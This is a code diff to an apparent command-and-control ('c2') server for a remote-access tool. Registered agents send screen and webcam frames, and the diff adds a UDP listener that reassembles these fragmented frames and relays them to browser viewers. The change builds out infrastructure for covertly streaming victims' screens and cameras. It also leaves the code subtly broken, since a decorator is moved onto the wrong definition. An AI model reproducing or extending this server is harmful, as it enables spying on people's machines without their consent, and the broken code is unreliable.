@@ -7,6 +7,8 @@ import logging
 import base64
 import subprocess
 import shutil
+import struct
+import uuid
 from contextlib import asynccontextmanager
 from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
 from collections import deque
@@ -16,6 +18,12 @@ import uvicorn
 
 logging.basicConfig(level=logging.INFO, format="[%(asctime)s] %(levelname)s  %(message)s")
 logger = logging.getLogger("c2")
+
+STREAM_PORT = int(os.environ.get("STREAM_PORT", "0"))
+
+_udp_frag_buf = {}  # device_id -> {seq: {frags: {}, total: int, ts: float}}
+_UDP_FRAG_TIMEOUT = 10.0
+
 logger.setLevel(logging.INFO)
 log_file = os.path.join(os.getcwd(), "server.log")
 file_handler = logging.FileHandler(log_file, encoding="utf-8")
@@ -45,10 +53,99 @@ def _ws_payload(msg: dict):
 
 
 @asynccontextmanager
+class UDPStreamProtocol(asyncio.DatagramProtocol):
+    """Receives stream frames from agents via UDP and relays to browser viewers."""
+
+    def datagram_received(self, data: bytes, addr):
+        try:
+            if len(data) < 43:
+                return
+            device_id = data[:36].decode("ascii", errors="replace")
+            seq = struct.unpack("<I", data[36:40])[0]
+            frame_type = data[40]
+            frag_total = data[41]
+            frag_idx = data[42]
+            payload = data[43:]
+            if frag_total < 1 or frag_idx >= frag_total:
+                return
+
+            if frag_total > 1:
+                key = (device_id, seq)
+                now = time.time()
+                if key not in _udp_frag_buf:
+                    _udp_frag_buf[key] = {"frags": {}, "total": frag_total, "ts": now}
+                entry = _udp_frag_buf[key]
+                entry["frags"][frag_idx] = payload
+                if len(entry["frags"]) >= entry["total"]:
+                    assembled = b"".join(entry["frags"][i] for i in range(entry["total"]))
+                    del _udp_frag_buf[key]
+                    asyncio.ensure_future(self._relay_frame(device_id, frame_type, assembled))
+            else:
+                asyncio.ensure_future(self._relay_frame(device_id, frame_type, payload))
+
+            now = time.time()
+            stale_keys = [k for k, v in _udp_frag_buf.items() if now - v["ts"] > _UDP_FRAG_TIMEOUT]
+            for k in stale_keys:
+                del _udp_frag_buf[k]
+        except Exception:
+            pass
+
+    async def _relay_frame(self, device_id: str, frame_type: int, payload: bytes):
+        session = await state.get_client(device_id)
+        if not session:
+            return
+        session.last_seen = time.time()
+        blob = bytes([frame_type]) + payload
+        if frame_type == 0x02:
+            await session.broadcast_cam_bytes(blob)
+        else:
+            await session.broadcast_bytes(blob)
+
+
+async def _cleanup_udp_frags():
+    while True:
+        await asyncio.sleep(15)
+        now = time.time()
+        stale = [k for k, v in _udp_frag_buf.items() if now - v["ts"] > _UDP_FRAG_TIMEOUT]
+        for k in stale:
+            del _udp_frag_buf[k]
+
+
 async def lifespan(app: FastAPI):
     os.makedirs("downloads", exist_ok=True)
     cleanup_task = asyncio.create_task(_cleanup_loop())
+    frag_task = asyncio.create_task(_cleanup_udp_frags())
+
+    udp_port = STREAM_PORT
+    udp_transport = None
+    if udp_port == 0:
+        try:
+            loop = asyncio.get_event_loop()
+            udp_transport, _ = await loop.create_datagram_endpoint(
+                UDPStreamProtocol, local_addr=("0.0.0.0", 0)
+            )
+            udp_port = udp_transport.get_extra_info("sockname")[1]
+            logger.info(f"🚀 UDP stream listener on port {udp_port}")
+        except Exception as ex:
+            logger.warning(f"UDP listener failed: {ex}")
+    else:
+        try:
+            loop = asyncio.get_event_loop()
+            udp_transport, _ = await loop.create_datagram_endpoint(
+                UDPStreamProtocol, local_addr=("0.0.0.0", udp_port)
+            )
+            logger.info(f"🚀 UDP stream listener on port {udp_port}")
+        except Exception as ex:
+            logger.warning(f"UDP listener on {udp_port} failed: {ex}")
+
     yield
+    if udp_transport:
+        udp_transport.close()
+    frag_task.cancel()
+    try:
+        await frag_task
+    except asyncio.CancelledError:
+        pass
     cleanup_task.cancel()
     try:
         await cleanup_task
@@ -80,6 +177,7 @@ class ClientSession:
         self.viewers = set()
         self.cam_viewers = set()
         self.camera_ws = None
+        self.udp_addr = None
         self.last_seen = time.time()
         self.created = time.time()
         self._agent_send_lock = asyncio.Lock()
@@ -1431,7 +1529,8 @@ async def ws_client(websocket: WebSocket):
                 if data.get("cmd") == CMD_REG:
                     device_id = data["data"]["id"]
                     await state.set_client(device_id, ClientSession(websocket, data["data"]))
-                    logger.info(f"✅ Node registered: {data['data'].get('hostname', '?')} ({device_id[:8]}...)")
+                    udp_info = f" (UDP:{STREAM_PORT or 'auto'})" if STREAM_PORT != 0 else ""
+                    logger.info(f"✅ Node registered: {data['data'].get('hostname', '?')} ({device_id[:8]}...){udp_info}")
                 elif device_id:
                     session = await state.get_client(device_id)
                     if session:
